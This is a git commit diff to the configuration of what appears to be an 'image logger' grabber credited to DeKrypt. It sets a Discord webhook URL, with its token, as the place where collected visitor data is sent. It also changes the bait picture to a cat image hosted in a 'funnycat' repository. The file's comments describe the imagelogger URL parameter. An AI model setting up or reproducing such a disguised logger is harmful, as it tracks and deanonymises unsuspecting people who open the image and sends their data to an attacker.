da49a7a13c6654d0a79282904fcc8e5f5356f07f
wfxpetike <136469855+wfxpetike@users.noreply.github.com>
2025-02-01 11:31:03 +0100

    Update as.py

--- api/as.py
+++ api/as.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335190275307601942/RYN0A1AYf7VC8szUKn1w5g_fIsbGrZ8UVP1a3CnVdDW0FuNoK7oOFMm93nFrQ8AiXFts",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://raw.githubusercontent.com/wfxpetike/funnycat/refs/heads/main/photo-1529778873920-4da4926a72c2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
